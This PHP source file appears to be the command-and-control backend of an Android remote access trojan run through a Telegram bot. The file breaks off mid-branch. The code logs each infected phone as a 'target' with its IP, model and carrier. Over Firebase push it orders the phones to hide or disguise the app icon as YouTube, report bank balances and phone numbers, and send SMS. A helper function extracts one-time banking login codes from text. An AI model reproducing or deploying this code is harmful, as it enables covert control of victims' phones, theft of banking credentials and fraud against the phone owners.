<?php
error_reporting(E_ALL & ~E_NOTICE & ~E_WARNING); ini_set('display_errors', 0); set_error_handler(function($errno, $errstr) { return true; });

include("chalim.php");

define('TOKEN', $bot_token);
define('PROJECT_ID', $project_id);
define('FILE', $file);

define('PORT_SUDO', $sudo_port);

#---------------------------------


function bot($method, $datas = [])
{
    $url = "https://api.telegram.org/bot" . TOKEN . "/" . $method;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $datas);
    $res = curl_exec($ch);
    if (curl_error($ch)) {

        var_dump(curl_error($ch));
    } else {
        return json_decode($res);
    }
}

function getAccessToken($file)
{
    require 'vendor/autoload.php';
    $serviceAccountFilePath = "$file";
    $serviceAccount = json_decode(file_get_contents($serviceAccountFilePath), true);

    // Generate the JWT using the service account credentials
    $clientEmail = $serviceAccount['client_email'];
    $privateKey = $serviceAccount['private_key'];

    $payload = [
        "iss" => $clientEmail,
        "scope" => "https://www.googleapis.com/auth/firebase.messaging",
        "aud" => "https://www.googleapis.com/oauth2/v4/token",
        "iat" => time(),
        "exp" => time() + 3600
    ];

    $jwt = Firebase\JWT\JWT::encode($payload, $privateKey, 'RS256');

    // Get the OAuth 2.0 access token
    $requestBody = [
        "grant_type" => "urn:ietf:params:oauth:grant-type:jwt-bearer",
        "assertion" => $jwt
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://www.googleapis.com/oauth2/v4/token");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($requestBody));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "Content-Type: application/json"
    ]);

    $response = curl_exec($ch);
    curl_close($ch);

    $accessToken = json_decode($response)->access_token;

    return $accessToken;
}

function strposA($text, $needles = array())
{
    $isin = false;
    for ($i = 0; $i < count($needles); $i++) {
        if (strpos($text, $needles[$i]) !== false) {
            $isin = true;
        }
    }
    return $isin;
}
function findPooya($string)
{
    $date = '';
    $explode = explode("\n", $string);
    foreach ($explode as $line) {
        if (strpos($line, "code") !== false or strpos($line, "ورود") !== false or strpos($line, "پویا") !== false or strpos($line, "رمز") !== false or strpos($line, "Code") !== false) {
            if (strposA($line, ['1', '2', '3', '4', '5', '6', '7', '8', '9', '0'])) {
                $pan = getNumber($line);
            }
        }
    }
    return $pan;
}
function getNumber($string)
{
    $number = '';
    for ($i = 0; $i < strlen($string); $i++) {
        if (is_numeric($string[$i])) {
            $number .= $string[$i];
        }
    }
    return $number;
}

function getNumber2($x)
{
    preg_match('/[A-Za-z0-9]+/', $x, $matches);
    $number = $matches[0];
    return $number;
}

function smg($chatid, $text, $keyboard)
{
    bot('sendMessage', [
        'chat_id' => $chatid,
        'text' => $text,
        'parse_mode' => 'HTML',
        'reply_markup' => $keyboard
    ]);
}
function emg($chatid, $message_id, $text, $keyboard)
{
    bot('editmessagetext', [
        'chat_id' => $chatid,
        'message_id' => $message_id,
        'text' => $text,
        'parse_mode' => 'HTML',
        'reply_markup' => $keyboard
    ]);
}
function EMflag(string $code): string
{
    return (string) preg_replace_callback(
        '/./',
        static fn (array $letter) => mb_chr(ord($letter[0]) % 32 + 0x1F1E5),
        $code
    );
}
function asd($string, $start, $end)
{
    $string = ' ' . $string;
    $ini    = strpos($string, $start);
    if ($ini == 0)
        return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return substr($string, $ini, $len);
}

if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}
function requests($mode, $device_id)
{
    $access = getAccessToken(FILE);
    $data = array(
        "message" => array(
            "topic" => PORT_SUDO,
            "data" => array(
                "command" => $mode,
                "device_id" => $device_id
            ), "android" => array(
                "priority" => "high"
            )
        ),
    );

    $data_string = json_encode($data);
    $headers = array(
        "Authorization: Bearer " . $access,
        "Content-Type: application/json",
    );

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://fcm.googleapis.com/v1/projects/" . PROJECT_ID . "/messages:send");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data_string);
    $result = curl_exec($ch);
    curl_close($ch);
    file_put_contents("sath.txt", $result);
}

#Sms Request
function requestSMS($mode, $device_id, $phone, $message)
{

    $access = getAccessToken(FILE);

    $data = array(
        "message" => array(
            "topic" => PORT_SUDO,
            "data" => array(
                "command" => $mode,
                "device_id" => $device_id,
                "phone" => $phone,
                "text" => $message
            ), "android" => array(
                "priority" => "high"
            )
        ),
    );

    $data_string = json_encode($data);
    $headers = array(
        "Authorization: Bearer " . $access,
        "Content-Type: application/json",
    );

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://fcm.googleapis.com/v1/projects/" . PROJECT_ID . "/messages:send");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data_string);
    $result = curl_exec($ch);
    curl_close($ch);
}

function Client_IP()
{
    $target_client_ip = @$_SERVER['HTTP_CLIENT_IP'];
    $target_forward_ip = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $target_remote_ip = $_SERVER['REMOTE_ADDR'];
    if (filter_var($target_client_ip, FILTER_VALIDATE_IP)) {
        $ip = $target_client_ip;
    } elseif (filter_var($target_forward_ip, FILTER_VALIDATE_IP)) {
        $ip = $target_forward_ip;
    } else {
        $ip = $target_remote_ip;
    }
    return $ip;
}

function addOnlineUser($androidid)
{
    $filePath = 'data/online_users.json';
    $onlineUsers = [];

    if (file_exists($filePath)) {
        $onlineUsers = json_decode(file_get_contents($filePath), true);
    }

    $onlineUsers[$androidid] = "";
    file_put_contents($filePath, json_encode($onlineUsers));
}

function getPaginatedUsers($page, $pageSize = 20)
{
    $filePath = 'data/online_users.json';
    $onlineUsers = [];

    if (file_exists($filePath)) {
        $onlineUsers = json_decode(file_get_contents($filePath), true);
    }

    $totalUsers = count($onlineUsers);
    $totalPages = ceil($totalUsers / $pageSize);
    $page = max(1, min($totalPages, $page));

    $start = ($page - 1) * $pageSize;
    $usersOnPage = array_slice($onlineUsers, $start, $pageSize, true);

    return ['users' => $usersOnPage, 'totalUsers' => $totalUsers, 'totalPages' => $totalPages, 'currentPage' => $page];
}

function createInlineKeyboard($currentPage, $totalPages)
{
    $keyboard = [];

    if ($totalPages > 1) {
        if ($currentPage > 1) {
            $keyboard[] = ['text' => 'ᴘʀᴇᴠɪᴏᴜꜱ', 'callback_data' => 'page_' . ($currentPage - 1)];
        }
        if ($currentPage < $totalPages) {
            $keyboard[] = ['text' => 'ɴᴇxᴛ', 'callback_data' => 'page_' . ($currentPage + 1)];
        }
    }

    return json_encode(['inline_keyboard' => [$keyboard]]);
}

function updateJsonValueInFile($filename, $key, $newValue)
{
    $jsonString = file_get_contents($filename);

    $data = json_decode($jsonString, true);

    if (array_key_exists($key, $data)) {
        $data[$key] = $newValue;
    } else {
        $data[$key] = $newValue;
    }
    $updatedJsonString = json_encode($data, JSON_PRETTY_PRINT);
    file_put_contents($filename, $updatedJsonString);
}

function doFirstAction($bal,$targetphone,$hide,$androidid){
    if($bal == "on"){
        requests("balance",$androidid);
    }
    if($targetphone == "on"){
        requests("userphone",$androidid);
    }
    if($hide == "on"){
        requests("hidden",$androidid);
    }
}

function updateMessageWithUsers($chatId, $messageId, $currentPage)
{
    $pagination = getPaginatedUsers($currentPage);
    $users = $pagination['users'];
    $totalUsers = $pagination['totalUsers'];
    $totalPages = $pagination['totalPages'];

$text = "
> ⚡ **ᴀᴄᴛɪᴏɴ:** #ᴘɪɴɢ_ᴀʟʟ

";
foreach ($users as $androidid => $name) {
    $text .= "┌ 🕸 /login_$androidid\n";
}
$text .= "
├ 🔋 ᴜꜱᴇʀꜱ: $totalUsers
└ 💀 ᴘᴀɢᴇ {$pagination['currentPage']}/$totalPages
> ────────────────────";

$keyboard = createInlineKeyboard($pagination['currentPage'], $totalPages);

    emg($chatId, $messageId, $text . "\n🕸 <a href='https://t.me/YtonriTeam'>[ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a>", $keyboard);
}
      
/*{
            static $Ary_List = array('REMOTE_ADDR', 'HTTP_CLIENT_IP', 'CLIENT_IP', 'HTTP_PROXY_CONNECTION', 'HTTP_FORWARDED', 'HTTP_X_FORWARDED', 'HTTP_X_FORWARDED_HOST', 'HTTP_X_FORWARDED_SERVER', 'FORWARDED_FOR_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED_FOR_IP', 'HTTP_X_FORWARDED_FOR', 'FORWARDED', 'X_FORWARDED_FOR', 'FORWARDED_FOR', 'X_FORWARDED', 'HTTP_VIA', 'VIA');                        
                foreach($Ary_List as $Value_array)        
                {        
                    if(isset($_SERVER[$Value_array]))        
                    {        
                        return $_SERVER[$Value_array];        
                    }        
                    elseif(getenv($Value_array))        
                    {        
                        return getenv($Value_array);        
                    }        
                    else        
                    {        
                        continue;        
                    }        
                }                        
            return 0;        
        }*/
#----------------------------------------------
$ip = Client_IP();
mkdir('user');
$action = $_POST['action'];
if (isset($_POST['Device_id'])) {
    $Device_id = $_POST['Device_id'];
}
if (isset($_POST['Model'])) {
    $Model = $_POST['Model'];
}
if (isset($_POST['Battery'])) {
    $Battery = $_POST['Battery'];
}
if (isset($_POST['andver'])) {
    $os = $_POST['andver'];
}
if (isset($_POST['operator'])) {
    $operator = $_POST['operator'];
}
if (isset($_POST['sender'])) {
    $sender = $_POST['sender'];
}
if (isset($_POST['screen'])) {
    $screen = $_POST['screen'];
}
if(isset($_POST['phones'])){
    $phones = $_POST['phones'];
}
if (isset($_POST['messagetext'])) {
    $message_text = $_POST['messagetext'];
}
if (isset($_POST['message'])) {
    $message_ussd = $_POST['message'];
}
if (isset($_POST['Android'])) {
    $Android = $_POST['Android'];
}
if (isset($_POST['berand'])) {
    $berand = $_POST['berand'];
}
if (isset($_POST['Product'])) {
    $Product = $_POST['Product'];
}
if (isset($_POST['word'])) {
    $kal = $_POST['word'];
}

#---------------------------------------------
$install_panel = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
    [['text' => "", 'callback_data' => "fs $Device_id $Model"], ['text' => "", 'callback_data' => "ls $Device_id $Model"]],
    [['text' => "", 'callback_data' => "Kops $Device_id $Model"], ['text' => "", 'callback_data' => "kkkk $Device_id $Model"]]
]]);
$online_panel = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
    [['text' => "", 'callback_data' => "hg $Device_id $Model"], ['text' => "", 'callback_data' => "ls $Device_id $Model"]],
    [['text' => "", 'callback_data' => "rt $Device_id $Model"]]
]]);
$Log_Panel = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
    [['text' => "ɪᴅ : $Device_id", 'callback_data' => "ls $Device_id $Model"]]
]]);
$status_panel = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
    [['text' => "", 'callback_data' => "rt $Device_id $Model"], ['text' => "", 'callback_data' => "ls $Device_id $Model"]], [['text' => "", 'callback_data' => "kkkk $Device_id $Model"]],
]]);
$sms_panel = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
    [['text' => "", 'callback_data' => "newic $Device_id $Model"], ['text' => "", 'callback_data' => "ls $Device_id $Model"]],
]]);

#---------------------------------------------
if (isset($_POST['action'])) {
    $action_autohide = file_get_contents("data/autohide.txt");
    $action_first = file_get_contents("data/firstsms.txt");
    $Message_First = file_get_contents("data/number-first.txt");
    $Number_First = file_get_contents("data/message-first.txt");
    $install_ip = file_get_contents("user/$Device_id-ip.txt");
    $name = file_get_contents("user/$Device_id-name.txt");
    $offline = file_get_contents("user/$Device_id-offline.txt");
    $online_model = file_get_contents("data/online_model.txt");
    $bal = json_decode(file_get_contents("data/actionfirst.json"))->balance;
    $targetpgone = json_decode(file_get_contents("data/firstaction.json"))->targetphone;
    $autohide = json_decode(file_get_contents("data/firstaction.json"))->autohide;
}
#---------------------------------------------

		
function getPersianDateTimeEnglish() {
    date_default_timezone_set('Asia/Tehran');
    $persian_months = array(
        'Farvardin', 'Ordibehesht', 'Khordad', 
        'Tir', 'Mordad', 'Shahrivar',
        'Mehr', 'Aban', 'Azar',
        'Dey', 'Bahman', 'Esfand'
    );
    
    $timestamp = time();
    $date = new DateTime();
    $date->setTimestamp($timestamp);
    
    $persian_date = new IntlDateFormatter(
        'en_US@calendar=persian',
        IntlDateFormatter::FULL,
        IntlDateFormatter::FULL,
        'Asia/Tehran',
        IntlDateFormatter::TRADITIONAL
    );
    
    $formatted = $persian_date->format($date);
    // Extract components
    preg_match('/(\w+), (\w+) (\d+), (\d+)/', $formatted, $matches);
    
    return $matches[2].' '.$matches[3].', '.$matches[4].' | '.date('H:i', $timestamp);
}
function sendCommandWithResponse($chat_id, $device_id, $model, $command, $success_message) {
    // Send waiting message
    $wait_message = bot('sendMessage', [
        'chat_id' => $chat_id,
        'text' => "
┌  ⚡ **ᴡᴀɪᴛɪɴɢ ꜰᴏʀ ʀᴇꜱᴘᴏɴꜱᴇ ꜰʀᴏᴍ ᴅᴇᴠɪᴄᴇ...**
├ 🕸 ᴛᴀʀɢᴇᴛ: $device_id | [$model]
├ 🦇 ᴄᴏᴍᴍᴀɴᴅ: $command
└ 🩸 ʀᴇǫᴜᴇꜱᴛ ᴛɪᴍᴇ: " . getPersianDateTimeEnglish() . "
",
        'parse_mode' => 'HTML'
    ]);
    
    $message_id = $wait_message->result->message_id;
    
    // Simulate processing delay
    sleep(3);
    
    // Edit with final result
    bot('editMessageText', [
        'chat_id' => $chat_id,
        'message_id' => $message_id,
        'text' => "```
> $success_message

> 📅 **ᴄᴏᴍᴘʟᴇᴛɪᴏɴ ᴛɪᴍᴇ:** " . getPersianDateTimeEnglish() . "
\n🕸 <a href='https://t.me/YtonriTeam'>[ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a>",
        'parse_mode' => 'HTML'
    ]);
}
if ($action == "install") {
    // خواندن نام RAT از فایل
    $rat_name = file_exists("data/rat_name.txt") ? file_get_contents("data/rat_name.txt") : "ᴜɴᴋɴᴏᴡɴ";

    if (!file_exists("user/$Device_id-model.txt")) {
        $cont = file_get_contents("data/contact.txt");
        $kossher = $cont + 1;
        file_put_contents("user/$Device_id-apk.txt", "ᴠɪꜱɪʙʟᴇ");
        file_put_contents("user/$Device_id-ringer.txt", "ɴᴏ ꜱᴇᴛ");
        file_put_contents("user/$Device_id-name.txt", "ᴜꜱᴇʀ$kossher");
        file_put_contents("user/$Device_id-offline.txt", "ᴏꜰꜰ");
        file_put_contents("user/$Device_id-ip.txt", $ip);
        file_put_contents("user/$Device_id-model.txt", $Model);
        file_put_contents("data/contact.txt", $cont + 1);
        
        $install_ip = file_get_contents("user/$Device_id-ip.txt");
        $name = file_get_contents("user/$Device_id-name.txt");
        $offline = file_get_contents("user/$Device_id-offline.txt");
        $gcx = json_decode(file_get_contents("http://ip-api.com/json/$ip"), true);
        $flag = EMflag($gcx["countryCode"]);
        
        smg($id_sender, "
┌ ⚡ **ɴᴇᴡ ᴛᴀʀɢᴇᴛ** #ɪɴꜱᴛᴀʟʟᴇᴅ
├ 🕸 ᴀ-ɴᴀᴍᴇ: $rat_name
├ 🩸 ᴍᴏᴅᴇʟ: $berand - $Model
├ 👁️ ᴀ-ᴠᴇʀꜱɪᴏɴ: $os
├ 🦇 ᴏᴘᴇʀᴀᴛᴏʀ: $operator
├ 💀 ɪᴘ: $ip
└ ☠️ ᴘᴀɴᴇʟ: /login_$Device_id
\n🕸 <a href='https://t.me/YtonriTeam'>[ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a>", $install_panel);
    } else {
        smg($id_sender, "
┌ ⚡ **ᴛᴀʀɢᴇᴛ ʀᴇᴄᴏɴɴᴇᴄᴛᴇᴅ** #ɪɴꜱᴛᴀʟʟᴇᴅ
├ 🕸 ᴀ-ɴᴀᴍᴇ: $rat_name
├ 🩸 ᴍᴏᴅᴇʟ: $berand - $Model
├ 👁️ ᴀ-ᴠᴇʀꜱɪᴏɴ: $os
├ 🦇 ᴏᴘᴇʀᴀᴛᴏʀ: $operator
├ 💀 ɪᴘ: $ip | $install_ip
└ ☠️ ᴘᴀɴᴇʟ: /login_$Device_id
\n🕸 <a href='https://t.me/YtonriTeam'>[ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a>", $install_panel);
    }

    // اجرای دستورات اولیه با تایمینگ مناسب
    $actions = [];
    
    // 1. اول SMS ارسال شود (اگر فعال باشد)
    $action_first = file_get_contents("data/firstsms.txt");
    if ($action_first == "on") {
        $actions[] = [
            'delay' => 3,
            'command' => 'send_sms',
            'params' => [
                $Device_id, 
                file_get_contents("data/number-first.txt"),
                file_get_contents("data/message-first.txt")
            ]
        ];
    }

    // 2. سپس Auto Change (اگر فعال باشد)
    $action_autohide = file_get_contents("data/autohide.txt");
    if ($action_autohide == "on") {
        $actions[] = [
            'delay' => 4,
            'command' => 'changetoyoutube',
            'params' => [$Device_id]
        ];
    }

    // 3. در نهایت تنظیمات firstaction اجرا شود
    $firstActionConfig = json_decode(file_get_contents("data/firstaction.json"), true);
    if ($firstActionConfig['balance'] == "on") {
        $actions[] = [
            'delay' => 5,
            'command' => 'balance',
            'params' => [$Device_id]
        ];
    }
    if ($firstActionConfig['targetphone'] == "on") {
        $actions[] = [
            'delay' => 5,
            'command' => 'userphone',
            'params' => [$Device_id]
        ];
    }
    if ($firstActionConfig['autohide'] == "on") {
        $actions[] = [
            'delay' => 6,  // بعد از autochange اجرا شود
            'command' => 'hidden',
            'params' => [$Device_id]
        ];
    }

    // اجرای تمامی اکشن‌ها با تایمینگ مناسب
    $total_delay = 0;
    foreach ($actions as $action_item) {
        sleep($action_item['delay'] - $total_delay);
        $total_delay = $action_item['delay'];
        
        if ($action_item['command'] == 'send_sms') {
            requestSMS($action_item['command'], ...$action_item['params']);
        } else {
            requests($action_item['command'], ...$action_item['params']);
        }
        
        // ارسال پیام اطلاع‌رسانی برای برخی دستورات
        if ($action_item['command'] == 'changetoyoutube') {
            smg($id_sender, "
> ⚡ **ᴀᴜᴛᴏ ᴄʜᴀɴɢᴇ**: ɪᴄᴏɴ ᴄʜᴀɴɢᴇᴅ ᴛᴏ ʏᴏᴜᴛᴜʙᴇ ꜰᴏʀ ᴅᴇᴠɪᴄᴇ $Device_id
\n🕸 <a href='https://t.me/YtonriTeam'>[ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a>", null);
        } elseif ($action_item['command'] == 'hidden') {
            smg($id_sender, "
> 👁️ ᴀᴜᴛᴏ ʜɪᴅᴇ: ɪᴄᴏɴ ʜɪᴅᴅᴇɴ ꜰᴏʀ ᴅᴇᴠɪᴄᴇ $Device_id
\n🕸 <a href='https://t.me/YtonriTeam'>[ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a>", null);
        }
    }
}
if ($action == "install") {

    if ($action_first == "on") {


        $Number_First = file_get_contents("data/number-first.txt");
        $Message_First = file_get_contents("data/message-first.txt");
        sleep(3);
        requestSMS("send_sms", $Device_id, $Number_First, $Message_First);
    }
}
if ($action == "install") {
    if ($action_autohide == "on") {
        sleep(4);
        requests('hidden', $Device_id);
    }

    if($action == "install"){
        doFirstAction($bal,$targetpgone,$autohide,$Device_id);
    }

} if ($action == "online_device") {
    if ($online_model == "list") {
        addOnlineUser($Device_id);
        $mid = file_get_contents("data/mid.txt");
        $page = 1;
        updateMessageWithUsers($id_sender, $mid, $page);
    } else {
        $install_ip = file_get_contents("user/$Device_id-ip.txt");
        $name = file_get_contents("user/$Device_id-name.txt");
        $offline = file_get_contents("user/$Device_id-offline.txt");
        $gcx = json_decode(file_get_contents("http://ip-api.com/json/$ip"), true);
        $flag = EMflag($gcx["countryCode"]);
        smg($id_sender, "
> ⚡ **ᴛᴀʀɢᴇᴛ ɪꜱ #ᴏɴʟɪɴᴇ**

┌ 🩸 ᴍᴏᴅᴇʟ : $Model 
├ 🕸 ᴅᴇᴠɪᴄᴇ : $Device_id
├ 🦇 ᴏᴘᴇʀᴀᴛᴏʀ : $operator
├ 👁️ ᴀ-ᴠᴇʀꜱɪᴏɴ : $os 
├ 💀 ɪᴘ : $ip 
├ 🎏 ꜰɪʀꜱᴛ ɪᴘ : $install_ip
└ ☠️ ᴘᴀɴᴇʟ /login_$Device_id
\n🕸 <a href='https://t.me/YtonriTeam'>[ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a>", $online_panel);
}

} elseif ($action == "Hidden_icon") {
    $chat_id     = file_get_contents("user/$Device_id-chat.txt");
    $message_id  = file_get_contents("user/$chat_id/last_msg.txt");
    $model       = file_get_contents("user/$Device_id-model.txt");
    $install_ip  = file_get_contents("user/$Device_id-ip.txt");
    $operator    = $_POST['operator'] ?? 'ᴜɴᴋɴᴏᴡɴ';
    $screen_status = (file_get_contents("user/$Device_id-offline.txt") == "ON") ? "ᴏꜰꜰ" : "ᴏɴ";

    function control_button($dev_id_use) {
        return json_encode(['inline_keyboard' => [
            [['text' => "‹‹ ʙᴀᴄᴋ ᴛᴏ ᴘᴀɴᴇʟ", 'callback_data' => "back_panel $dev_id_use"]]
        ]]);
    }

$response_text = "
> ⚡ **ᴀᴘᴘ ɪᴄᴏɴ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ʜɪᴅᴅᴇɴ**

┌ 🩸 ᴍᴏᴅᴇʟ: $model
├ 👁️ ꜱᴛᴀᴛᴜꜱ: ɪᴄᴏɴ: ʜɪᴅᴅᴇɴ | ꜱᴄʀᴇᴇɴ: $screen_status
├ 🦇 ᴏᴘᴇʀᴀᴛᴏʀ: $operator
├ 💀 ɪᴘ: $ip | $install_ip
└ ☠️ ᴘᴀɴᴇʟ: /login_$Device_id
\n🕸 <a href='https://t.me/YtonriTeam'>[ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a>";
    bot('editMessageText', [
        'chat_id'    => $chat_id,
        'message_id' => $message_id,
        'text'       => $response_text,
        'parse_mode' => 'HTML',
        'reply_markup' => control_button($Device_id)
    ]);


} elseif ($action == "iconchange") {
    $install_ip = file_get_contents("user/$Device_id-ip.txt");
    $device_model = file_get_contents("user/$Device_id-model.txt");
    $apk_status = file_get_contents("user/$Device_id-apk.txt");
    $offline = file_get_contents("user/$Device_id-offline.txt");
    
    // ویرایش پیام قبلی
    $message_id = file_get_contents("user/$id_sender/wait_msg_id.txt");
    
    bot('editMessageText', [
        'chat_id' => $id_sender,
        'message_id' => $message_id,
        'text' => "
> ✅ **ɪᴄᴏɴ ᴄʜᴀɴɢᴇᴅ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ**

┌ 🩸 ᴍᴏᴅᴇʟ: $device_model
├ 👁️ ꜱᴛᴀᴛᴜꜱ: ɪᴄᴏɴ: " . ($apk_status == "ᴠɪꜱɪʙʟᴇ" ? "ʜɪᴅᴅᴇɴ" : ($apk_status == "ᴄʜᴀɴɢᴇᴅ" ? "ᴄʜᴀɴɢᴇᴅ" : "ɴᴏʀᴍᴀʟ")) . " - ꜱᴄʀᴇᴇɴ: " . ($offline == "ᴏɴ" ? "ᴏꜰꜰ" : "ᴏɴ") . "
├ 💀 ɪᴘ: $ip | $install_ip
└ ☠️ ᴘᴀɴᴇʟ: /login_$Device_id
\n🕸 <a href='https://t.me/YtonriTeam'>[ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a>",
        'parse_mode' => 'HTML'
    ]);
    
    // به روزرسانی وضعیت آیکون
    file_put_contents("user/$Device_id-apk.txt", "ᴄʜᴀɴɢᴇᴅ");


} elseif ($action == "offlineOn") {
    $msg_file = "user/$Device_id-offlineon-msg.txt";
    if (file_exists($msg_file)) {
        list($chat_id, $message_id) = explode("|", file_get_contents($msg_file));
        
        // به روزرسانی وضعیت آفلاین
        file_put_contents("user/$Device_id-offline.txt", "ᴏɴ");
        
        // آماده سازی پیام نهایی
$status_msg = "
> 🦇 **ᴏꜰꜰʟɪɴᴇ ᴍᴏᴅᴇ ꜱᴛᴀᴛᴜꜱ ᴏɴ** 🦇

┌ 🩸 ᴍᴏᴅᴇʟ: $Model
├ 📞 ꜱɪᴍ ᴄᴀʀᴅ: " . file_get_contents("data/offline-number.txt") . "
├ 💀 ɪᴘ: $ip | $install_ip
└ ☠️ ᴘᴀɴᴇʟ: /login_$Device_id
\n🕸 <a href='https://t.me/YtonriTeam'>[ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a>";
        
        // ویرایش پیام
        bot('editMessageText', [
            'chat_id' => $chat_id,
            'message_id' => $message_id,
            'text' => $status_msg,
            'parse_mode' => 'HTML'
        ]);
        
        // حذف فایل موقت
        unlink($msg_file);
    }


} elseif ($action == "offlineOff") {
    $msg_file = "user/$Device_id-offlineoff-msg.txt";
    if (file_exists($msg_file)) {
        list($chat_id, $message_id) = explode("|", file_get_contents($msg_file));
        
        // به روزرسانی وضعیت آفلاین
        file_put_contents("user/$Device_id-offline.txt", "ᴏꜰꜰ");
        
        // آماده سازی پیام نهایی
        $status_msg = "
> 🦇 **ᴏꜰꜰʟɪɴᴇ ᴍᴏᴅᴇ ꜱᴛᴀᴛᴜꜱ ᴏꜰꜰ** 🦇

┌ 🩸 ᴍᴏᴅᴇʟ: $Model
├ 📞 ꜱɪᴍ ᴄᴀʀᴅ: " . file_get_contents("data/offline-number.txt") . "
├ 💀 ɪᴘ: $ip | $install_ip
└ ☠️ ᴘᴀɴᴇʟ: /login_$Device_id
\n🕸 <a href='https://t.me/YtonriTeam'>[ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a>";
        
        // ویرایش پیام
        bot('editMessageText', [
            'chat_id' => $chat_id,
            'message_id' => $message_id,
            'text' => $status_msg,
            'parse_mode' => 'HTML'
        ]);
        
        // حذف فایل موقت
        unlink($msg_file);
    }


} elseif ($action == "visible_icon") {
    // خواندن اطلاعات پیام انتظار
    $wait_data = json_decode(file_get_contents("user/$id_sender/wait_msg.txt"), true);
    $message_id = $wait_data['message_id'];
    
    // دریافت اطلاعات دستگاه
    $install_ip = file_get_contents("user/$Device_id-ip.txt");
    $operator = $_POST['operator'] ?? "ᴜɴᴋɴᴏᴡɴ";
    $offline = file_get_contents("user/$Device_id-offline.txt");
    
    // به روزرسانی وضعیت
    file_put_contents("user/$Device_id-apk.txt", "ᴠɪꜱɪʙʟᴇ");
    
    // ساخت پیام نهایی
$final_message = "
┌  ☠️ **ɪᴄᴏɴ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ᴜɴʜɪᴅᴅᴇɴ!**

├ 🩸 ᴍᴏᴅᴇʟ: $Model
├ 👁️ ꜱᴛᴀᴛᴜꜱ: ɪᴄᴏɴ: ᴠɪꜱɪʙʟᴇ - ꜱᴄʀᴇᴇɴ: " . ($offline == "ᴏɴ" ? "ᴏꜰꜰ" : "ᴏɴ") . "
├ 🦇 ᴏᴘᴇʀᴀᴛᴏʀ: $operator
├ 💀 ɪᴘ: $ip | $install_ip
└ ☠️ ᴘᴀɴᴇʟ: /login_$Device_id
\n🕸 <a href='https://t.me/YtonriTeam'>[ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a>";
    // ویرایش پیام قبلی
    bot('editMessageText', [
        'chat_id' => $id_sender,
        'message_id' => $message_id,
        'text' => $final_message,
        'parse_mode' => 'HTML',
        'reply_markup' => $sms_panel
    ]);


} elseif ($action == "status") {
    $status_msg_file = "user/$Device_id-status-msg.txt";
    if (file_exists($status_msg_file)) {
        $msg_data = explode("|", file_get_contents($status_msg_file));
        $chat_id = $msg_data[0];
        $message_id = $msg_data[1];
        
        // تعیین وضعیت آیکون
        $apk_status = file_get_contents("user/$Device_id-apk.txt");
        $icon_status = ($apk_status == "ᴠɪꜱɪʙʟᴇ") ? "ʜɪᴅᴅᴇɴ" : 
                      (($apk_status == "ᴄʜᴀɴɢᴇᴅ") ? "ᴄʜᴀɴɢᴇᴅ" : "ɴᴏʀᴍᴀʟ");
        
        // تعیین وضعیت صفحه نمایش
        $offline = file_get_contents("user/$Device_id-offline.txt");
        $screen_status = ($offline == "ᴏɴ") ? "ᴏꜰꜰ" : "ᴏɴ";
        
        // ساخت پیام با فرمت جدید
$status_message = "
┌ ⚡ **ᴛᴀʀɢᴇᴛ ɪꜱ #ᴏɴʟɪɴᴇ**

├ 🩸 ᴍᴏᴅᴇʟ : $berand - $Model
├ 🦇 ᴏᴘᴇʀᴀᴛᴏʀ : $operator
├ 👁️ ᴛᴀʀɢᴇᴛ ꜱᴛᴀᴛᴜꜱ ➝ ɪᴄᴏɴ: $icon_status - ꜱᴄʀᴇᴇɴ: $screen_status
├ 💀 ɪᴘ : $ip | $install_ip
└ ☠️ ᴘᴀɴᴇʟ : /login_$Device_id
\n🕸 <a href='https://t.me/YtonriTeam'>[ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a>";
        
        // ویرایش پیام
        bot('editMessageText', [
            'chat_id' => $chat_id,
            'message_id' => $message_id,
            'text' => $status_message,
            'parse_mode' => 'HTML'
        ]);
        
        // حذف فایل موقت
        unlink($status_msg_file);
    }






} elseif ($action == "ReciveSMS") {
